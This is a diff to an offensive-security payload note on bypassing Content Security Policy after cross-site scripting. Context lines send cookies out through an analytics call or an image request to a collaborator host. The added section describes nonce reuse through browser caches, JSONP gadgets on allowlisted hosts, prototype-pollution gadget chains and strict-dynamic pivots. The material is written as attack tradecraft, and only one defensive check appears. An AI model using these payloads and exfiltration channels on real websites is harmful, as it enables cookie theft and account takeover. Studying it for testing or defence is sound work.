@@ -4,7 +4,7 @@ type: payloads
 tags: [payloads, csp, csp-bypass, xss, web]
 sources: [hacktricks-web]
 date_created: 2026-07-15
-date_updated: 2026-07-15
+date_updated: 2026-11-11
 ---
 
 # Payloads: CSP Bypass
@@ -101,7 +101,6 @@ fbq('trackCustom', 'x', {data: document.cookie})
 
 - **Service-worker `importScripts()`** is not CSP-restricted; dangling-markup and `<meta http-equiv>` refresh survive script-only policies (see [[dangling-markup]]).
 
-
 ## Pick the exfiltration channel by directive, not by habit
 
 Once script execution is confirmed (stored/DOM XSS), do not default to `fetch()`/`XMLHttpRequest` for exfiltration. Read the live CSP's directive list first: `connect-src` governs fetch/XHR/WebSocket, but `img-src` is a SEPARATE, commonly more permissive directive (often left wide or unset while `connect-src` is locked to `'self'`). A GET issued via `new Image().src = 'https://collab/x?'+data` is governed by `img-src`, not `connect-src`, and fires even when a strict `connect-src` blocks every fetch-based exfil attempt.
@@ -131,3 +130,22 @@ The same choice matters off the page too: some corporate egress proxies block ou
   and the matched value cached/reloaded, recovering the live nonce for a forged script tag.
   Pair with the existing querySelector nonce steal above for the no-CSS-injection case.
   https://github.com/Karthikdude/Advanced-XSS
+
+## NEW 2025-2026
+
+1. **Nonce reuse via browser cache** (2025 technique): with HTML injection but no script
+   execution, the back/forward cache (bfcache) or HTTP cache can serve a page whose
+   nonce-bearing script tag was already cached; reuse that nonce on the injected
+   `<script nonce=...>`. Works against per-request nonces when the HTML is cacheable.
+   Defense check: HTML responses with `Cache-Control: no-store` close it.
+   https://cybersecuritynews.com/content-security-policy-bypass/
+2. **JSONP gadget on any allowlisted host**: one allowlisted third-party host with a
+   JSONP/redirect endpoint = arbitrary JS execution (`<script src=allowlisted/?cb=...>`).
+   Enumerate every `script-src` entry for callback/jsonp/redirect params before calling
+   a policy strict. https://centralcsp.com/en/blog/jsonp-csp-bypass
+3. **Prototype-pollution gadget chain**: pollute `Object.prototype` so a later gadget
+   (script-src assignment, DOM sink config) carries the payload - CSP never sees a
+   second script load because the gadget itself is first-party.
+4. **strict-dynamic pivot**: one allowlisted script (SRI'd or not) that creates script
+   elements propagates trust to attacker-injected ones; hunt library loaders, analytics
+   bootstraps, and old jQuery `$.getScript` flows.
